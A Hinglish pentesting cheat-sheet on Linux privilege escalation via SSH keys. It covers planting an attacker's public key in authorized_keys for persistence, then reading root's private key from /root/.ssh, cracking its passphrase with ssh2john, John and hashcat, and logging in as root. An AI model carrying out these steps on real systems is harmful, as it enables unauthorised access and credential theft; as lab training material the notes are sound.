
#  Linux PrivEsc via SSH Key Manipulation

SSH (Secure Shell) ka use bina password ke login karne ke liye kiya jata hai agar hamare paas sahi keys ho. PrivEsc ke liye hum do methods ka use karte hain.

---

## Method 1: Key Injection (Creating Persistence)

Jab hamare paas system ka access (netcat shell) ho aur hum chahte hain ki hum SSH ke zariye login kar sakein.

### 1. Conceptual Understanding

- **Private Key (`id_rsa`):** Ye attacker (aapki) machine par rehti hai. Ye aapka "password" hai.
    
- **Public Key (`id_rsa.pub`):** Ye target machine par `.ssh/authorized_keys` file mein dali jati hai.
    

### 2. Steps to Execute

1. **Generate Keys (On your Attacker Machine):**
    
    Bash
    
    ```
    ssh-keygen -f mykey
    ```
    
    _(Isse do files banengi: `mykey` (private) aur `mykey.pub` (public))._
    
2. **Target par Folder Setup (On Netcat Shell):** Target user ki home directory mein `.ssh` folder banayein:
    
    
    
    ```
    mkdir -p ~/.ssh
    ```
    
3. **Public Key Transfer:** Apni `mykey.pub` ka content copy karein aur target ki `authorized_keys` file mein daal dein:

```
echo "ssh-rsa AAAAB3Nza...[Aapki_Public_Key]..." >> ~/.ssh/authorized_keys
```

    
4.  **Login via SSH:**
    Ab apni machine se bina password ke login karein:

    ```
   ssh -i mykey username@target-ip
    ```
---

## ⚡ Method 2: Stealing Root's `id_rsa` (PrivEsc)
Agar enumeration ke waqt aapko root user ki private key (`id_rsa`) mil jati hai (bash history, backups, ya misconfigurations se), toh aap seedha root ban sakte hain.

### 1. Identify the Key
Check karein ki kya aap root ki private key read kar sakte hain:

```
cat /root/.ssh/id_rsa
```
   
### 2. Setup on Attacker Machine

1. Root ki key ka content copy karein aur apni machine par ek file (e.g., `root_key`) mein save karein.
    
2. **Permissions (Crucial):** SSH private key tabhi kaam karti hai agar uski permissions restricted hon:

    ```
    chmod 600 root_key
    ```
    

### 3. Cracking the Passphrase (If Encrypted)

Agar key mangne par password maang rahi hai, toh **John The Ripper** ka use karein:

1. **Convert to John format:**

    ```
    ssh2john root_key > root_key_hash
    ```

2. **Crack it:**
3. 

```
 john --wordlist=/usr/share/wordlists/rockyou.txt root_key_hash
 hashcat -m 22921 -a 0 root_key_hash /usr/share/wordlists/rockyou.txt root_key_hash
```

### 4. Gaining Root Access
Ek baar password mil jaye (ya agar password na ho), toh seedha login karein:

```
ssh -i root_key root@target-ip
```

We are` root!`

---